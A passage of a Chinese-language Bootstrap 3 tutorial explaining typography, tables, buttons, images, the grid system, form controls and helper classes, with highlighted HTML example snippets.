<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">strong</span>&gt;</span>Twitter, Inc.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  795 Folsom Ave, Suite 600<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  San Francisco, CA 94107<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">"Phone"</span>&gt;</span>P:<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span> (123) 456-7890</span><br><span class="line"><span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">strong</span>&gt;</span>Full Name<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"mailto:#"</span>&gt;</span>first.last@example.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>引用</strong>
<ul>
<li>默认样式引用，增加了左边线，设定了字体大小和内外边距<br />
<code>&lt;blockquote&gt; Bootstrap 框架 &lt;/blockquote&gt;</code></li>
<li>反向<br />
<code>&lt;blockquote class=&quot;blockquote-reverse &quot;&gt; Bootstrap 框架 &lt;/blockquote&gt;</code></li>
<li>多种引用样式</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"text-right"</span>&gt;</span>Someone famous in <span class="tag">&lt;<span class="name">cite</span> <span class="attr">title</span>=<span class="string">"Source Title"</span>&gt;</span>Source Title<span class="tag">&lt;/<span class="name">cite</span>&gt;</span><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><strong>列表</strong></p>
<ul>
<li>有序列表、无序列表、自定义列表
<ul>
<li><code>.list-unstyled</code></li>
<li><code>.list-inline</code></li>
<li><code>.dl-horizontal</code>  应用于<code>&lt;dl&gt;</code>元素和<code>&lt;dt&gt;</code>元素中</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>代码</strong></p>
<ul>
<li><code>.pre-scrollable</code>  使 <code>&lt;pre&gt;</code> 元素可滚动 <code>scrollable</code></li>
<li>内联代码   <code>&lt;code&gt;&lt;section&gt;&lt;/code&gt;</code></li>
<li>用户输入   <code>press &lt;kbd&gt;ctrl + ,&lt;/kbd&gt;</code></li>
<li>标记变量   <code>&lt;var&gt;y&lt;/var&gt; = &lt;var&gt;m&lt;/var&gt;&lt;var&gt;x&lt;/var&gt; + &lt;var&gt;b&lt;/var&gt;</code></li>
<li>程序输出   <code>&lt;samp&gt;This text is meant to be treated as sample output from a computer program.&lt;/samp&gt;</code></li>
<li>代码块     <code>&lt;pre&gt;&lt;article&gt;Please input...&lt;/article&gt;&lt;/pre&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="三-表格-按钮-图片"><a class="markdownIt-Anchor" href="#三-表格-按钮-图片"></a> 三、表格、按钮、图片</h4>
<hr />
<ul>
<li>
<p><strong>表格</strong></p>
<ul>
<li>基本表格 <code>&lt;table class=&quot;table&quot;&gt;</code></li>
<li>条纹表格 <code>&lt;table class=&quot;table table-striped&quot;&gt;</code></li>
<li>边框表格  <code>&lt;table class=&quot;table table-bordered&quot;&gt;</code></li>
<li>悬停表格<code>&lt;table class=&quot;table table-hover&quot;&gt;</code></li>
<li>精简表格<code>&lt;table class=&quot;table table-condensed&quot;&gt;</code></li>
<li>状态表格<code>active</code>、<code>success</code>、<code>info</code>、<code>warning</code>、<code>danger</code></li>
<li>隐藏某一行<code>&lt;tr class=&quot;sr-only&quot;&gt;</code></li>
<li>响应式表格
<ul>
<li>表格父元素设置响应式，小于 <code>768px</code> 出现边框<br />
<code>&lt;div class=&quot;table-responsive&quot;&gt;</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>按钮</strong></p>
<ul>
<li>按钮标签
<ul>
<li>转化成普通按钮</li>
<li><code>&lt;a href=&quot;###&quot; class=&quot;btn btn-default&quot;&gt;Link&lt;/a&gt;</code></li>
<li><code>&lt;button class=&quot;btn btn-default&quot;&gt;Button&lt;/button&gt;</code></li>
<li><code>&lt;input type=&quot;button&quot; class=&quot;btn btn-default&quot; value=&quot;input&quot;&gt;</code></li>
<li>注意：为了跨浏览器展现，尽量使用<code>button</code></li>
</ul>
</li>
<li>按钮大小
<ul>
<li><code>.btn-lg</code>	这会让按钮看起来比较大。</li>
<li><code>.btn-sm</code>	这会让按钮看起来比较小。</li>
<li><code>.btn-xs</code>	这会让按钮看起来特别小。</li>
</ul>
</li>
<li>预定义样式
<ul>
<li><code>.btn-default</code>	默认/标准按钮</li>
<li><code>.btn-primary</code>	首选项样式</li>
<li><code>.btn-success</code>	成功样式</li>
<li><code>.btn-info</code>一般信息样式</li>
<li><code>.btn-warning</code>	警告样式</li>
<li><code>.btn-danger</code>	危险样式</li>
<li><code>.btn-link</code>	链接样式</li>
</ul>
</li>
<li>块级按钮
<ul>
<li><code>.btn-block</code>	块级按钮(拉伸至父元素100%的宽度)</li>
</ul>
</li>
<li>激活状态
<ul>
<li><code>&lt;button class=&quot;btn active&quot;&gt;Button&lt;/button&gt;</code></li>
</ul>
</li>
<li>禁用状态
<ul>
<li><code>&lt;button class=&quot;btn active disabled&quot;&gt;Button&lt;/button&gt;</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>图片</strong></p>
<ul>
<li><code>.img-rounded</code>   圆角 (<code>IE8</code> 不支持)</li>
<li><code>.img-circle</code> 圆形 (<code>IE8</code> 不支持)</li>
<li><code>.img-thumbnail</code>  缩略图功能</li>
<li><code>.img-responsive</code>	图片响应式 (将很好地扩展到父元素)</li>
</ul>
</li>
</ul>
<h4 id="四-栅格系统-表单"><a class="markdownIt-Anchor" href="#四-栅格系统-表单"></a> 四、栅格系统、表单</h4>
<hr />
<ul>
<li><strong>栅格系统</strong>
<ul>
<li>
<p>响应式网格系统随着屏幕或视口（<code>viewport</code>）尺寸的增加，系统会自动分为最多<code>12</code>列。</p>
</li>
<li>
<p>工作原理</p>
<ul>
<li>行必须放置在<code>.container</code>(固定宽度)或者<code>.container-fluid(100%宽度)</code>  <code>class</code>内，获得适当的对齐<code>(alignment)</code>和内边距<code>(padding)</code></li>
<li>内容放置在列中，唯有列可以是行的直接子元素</li>
<li>预定义的网格类，比如 <code>.row</code> 和 <code>.col-lg-4</code>，可用于快速创建网格布局</li>
<li>列通过内边距<code>（padding）</code>来创建列内容之间的间隙</li>
</ul>
</li>
<li>
<p>媒体查询</p>
<ul>
<li>超小设备（手机，小于 <code>768px</code>）</li>
<li>没有任何媒体查询相关的代码，因为这在 Bootstrap 中是默认的（还记得 <code>Bootstrap</code> 是移动设备优先的吗？）</li>
<li>小型设备（平板电脑，大于等于<code>768px</code>）<code>@media (min-width: @screen-sm-min) and (max-width: @screen-sm-max) { ... }</code></li>
<li>中型设备（台式电脑，大于等于<code>992px</code>）<code>@media (min-width: @screen-md-min) and (max-width: @screen-md-max) { ... }</code></li>
<li>大型设备（大台式电脑，大于等于<code>1200px</code>）<code>@media (min-width: @screen-lg-min) { ... }</code></li>
</ul>
</li>
<li>
<p>栅格参数</p>
<ul>
<li>超小屏幕 手机 (<code>&lt;768px</code>)</li>
<li>小屏幕 平板 (<code>≥768px</code>)</li>
<li>中等屏幕 桌面显示器 (<code>≥992px</code>)</li>
<li>大屏幕 大桌面显示器 (<code>≥1200px</code>)</li>
<li>栅格系统行为
<ul>
<li>总是水平排列</li>
<li>开始是堆叠在一起的，当大于这些阈值时将变为水平排列C</li>
</ul>
</li>
<li><code>.container</code> 最大宽度	<code>None</code>（自动）<code>750px</code>  <code>970px</code>  <code>1170px</code></li>
<li>类前缀 <code>.col-xs-</code>  <code>.col-sm-</code>	 <code>.col-md-</code>	  <code>.col-lg-</code></li>
<li>列（<code>column</code>）数	<code>12</code></li>
<li>最大列（<code>column</code>）宽	自动 <code>~62px</code> <code>~81px</code>	<code>~97px</code></li>
<li>间隙宽度	 <code>30px</code> （每列左右均有 <code>15px</code>）</li>
</ul>
</li>
<li>
<p>四种屏幕分类全部激活</p>
</li>
</ul>
</li>
</ul>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-lg-3 col-md-4 col-sm-6 col-xs-12 a"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-lg-3 col-md-4 col-sm-6 col-xs-12 a"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-lg-3 col-md-4 col-sm-6 col-xs-12 a"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         ....</span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以设置列偏移，让中间保持空隙</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-8"</span>&gt;</span>1-8<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-3 col-md-offset-1"</span>&gt;</span>10-12<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以嵌套，嵌满也是 12 列</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-9"</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-8"</span>&gt;</span>1-8<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4"</span>&gt;</span>9-12<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-3"</span>&gt;</span> 10-12 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以把两个列交换位置，<code>push</code> 向右移动（推），<code>pull</code> 向左移动（拉）</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-8 col-md-push-4"</span>&gt;</span>8<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-pull-8"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>表单</strong>
<ul>
<li>垂直或基本表单</li>
<li>内联表单
<ul>
<li>让表单左对齐浮动，并表现为 <code>inline-block</code>内联块结构<code>&lt;form class=&quot;form-inline&quot;&gt;</code><br />
注：当小于 <code>768px</code>，会恢复独占样式</li>
</ul>
</li>
<li>水平表单
<ul>
<li>让表单内的元素保持水平排列</li>
</ul>
</li>
<li>表单组合
<ul>
<li>前后增加片段</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span>￥<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span>.00<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>输入框、文本域
<ul>
<li>原生的<code>HTML5</code>的<code>input</code>类型的支持</li>
<li>包括：
<ul>
<li><code>text</code></li>
<li><code>password</code></li>
<li><code>datetime</code></li>
<li><code>datetime-local</code></li>
<li><code>date</code></li>
<li><code>month</code></li>
<li><code>time</code></li>
<li><code>week</code></li>
<li><code>number</code></li>
<li><code>email</code></li>
<li><code>url</code></li>
<li><code>search</code></li>
<li><code>tel</code></li>
<li><code>color</code></li>
</ul>
</li>
<li><code>&lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;文本输入&quot;&gt;</code></li>
<li><code>&lt;textarea class=&quot;form-control&quot; rows=&quot;3&quot;&gt;&lt;/textarea&gt;</code></li>
<li>复选框（<code>Checkbox</code>）和单选框（<code>Radio</code>）</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"checkbox"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span>选项 1<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"radio"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"optionsRadios"</span> <span class="attr">id</span>=<span class="string">"optionsRadios1"</span></span></span><br><span class="line"><span class="tag">	   <span class="attr">value</span>=<span class="string">"option1"</span> <span class="attr">checked</span>&gt;</span> 选项 1</span><br><span class="line"> <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>内联的复选框和单选框</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"checkbox-inline"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"inlineCheckbox1"</span> <span class="attr">value</span>=<span class="string">"option1"</span>&gt;</span> 选项 1</span><br><span class="line"><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">id</span>=<span class="string">"optionsRadiosinline"</span> <span class="attr">value</span>=<span class="string">"option1"</span>&gt;</span> 选项 1</span><br><span class="line"><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>选择框    <code>multiple</code>多行显示</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">option</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">option</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">option</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">option</span>&gt;</span>4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">option</span>&gt;</span>5<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>静态控件   <code>.form-control-static</code></li>
<li>表单控件状态
<ul>
<li>输入框焦点</li>
<li>当输入框 <code>input</code> 接收到<code>:focus</code> 时，输入框的轮廓会被移除，同时应用 <code>box-shadow</code>。</li>
<li>禁用的输入框 <code>input</code></li>
<li>如果您想要禁用一个输入框 <code>input</code>，只需要简单地添加 <code>disabled</code> 属性，这不仅会禁用输入框，还会改变输入框的样式以及当鼠标的指针悬停在元素上时鼠标指针的样式。</li>
<li>禁用的字段集 <code>fieldset</code></li>
<li>对 <code>&lt;fieldset&gt;</code> 添加 <code>disabled</code> 属性来禁用<code>&lt;fieldset&gt;</code> 内的所有控件。</li>
<li>校验状态
<ul>
<li><code>.has-warning</code>、<code>.has-error</code> 或 <code>.has-success</code> 类到这些控件的父元素即可。</li>
</ul>
</li>
<li>任何包含在此元素之内的 <code>.control-label</code>、<code>.form-control</code> 和 <code>.help-block</code> 元素都将接受这些校验状态的样式。</li>
</ul>
</li>
<li>表单帮助文本</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">role</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span>一个较长的帮助文本块，超过一行，需要扩展到下一行。本实例中的帮助文本总共有两行。<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>控件尺寸
<ul>
<li><code>.input-lg</code>和<code>col-lg-*</code>来设置表单的高度和宽度</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control input-lg"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"input-lg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-lg-2"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"col-lg-2"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-lg-3"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"col-lg-3"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-lg-4"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"col-lg-4"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="五-辅助类-响应式工具-菜单-图标"><a class="markdownIt-Anchor" href="#五-辅助类-响应式工具-菜单-图标"></a> 五、辅助类、响应式工具、菜单、图标</h4>
<hr />
<h4 id="辅助类"><a class="markdownIt-Anchor" href="#辅助类"></a> 辅助类</h4>
<hr />
<ul>
<li><strong>文本</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-muted"</span>&gt;</span>本行内容是减弱的<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-primary"</span>&gt;</span>本行内容带有一个 primary class<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-success"</span>&gt;</span>本行内容带有一个 success class<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-info"</span>&gt;</span>本行内容带有一个 info class<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-warning"</span>&gt;</span>本行内容带有一个 warning class<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-danger"</span>&gt;</span>本行内容带有一个 danger class<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>背景</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"bg-primary"</span>&gt;</span>bootstrap课程<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"bg-success"</span>&gt;</span>bootstrap课程<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"bg-info"</span>&gt;</span>bootstrap课程<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"bg-warning"</span>&gt;</span>bootstrap课程<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"bg-danger"</span>&gt;</span>bootstrap课程<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>关闭按钮   <code>close</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"close"</span>&gt;</span>×<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>下拉式菜单  <code>caret</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>浮动 <code>pull-left</code>   <code>pull-right</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pull-left"</span>&gt;</span>向左快速浮动<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pull-right"</span>&gt;</span>向右快速浮动<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>清除浮动   <code>clearfix</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"clearfix"</span>  <span class="attr">style</span>=<span class="string">"background: #D8D8D8;border: 1px solid #000;padding: 10px;"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pull-left"</span> <span class="attr">style</span>=<span class="string">"background:#58D3F7;"</span>&gt;</span>向左快速浮动<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pull-right"</span> <span class="attr">style</span>=<span class="string">"background: #DA81F5;"</span>&gt;</span>向右快速浮动<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>块级内容居中 <code>center-block</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center-block"</span> <span class="attr">style</span>=<span class="string">"width:200px;background-color:#ccc;"</span>&gt;</span></span><br><span class="line">	这是 center-block</span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>显示、隐藏  <code>show</code> <code>hide</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span> <span class="attr">style</span>=<span class="string">"padding: 91px 100px 19px 50px;"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"show"</span> <span class="attr">style</span>=<span class="string">"width:300px;background-color:#ccc;"</span>&gt;</span></span><br><span class="line">	这是 show class</span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"hidden"</span> <span class="attr">style</span>=<span class="string">"width:200px;background-color:#ccc;"</span>&gt;</span></span><br><span class="line">	这是 hide class</span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 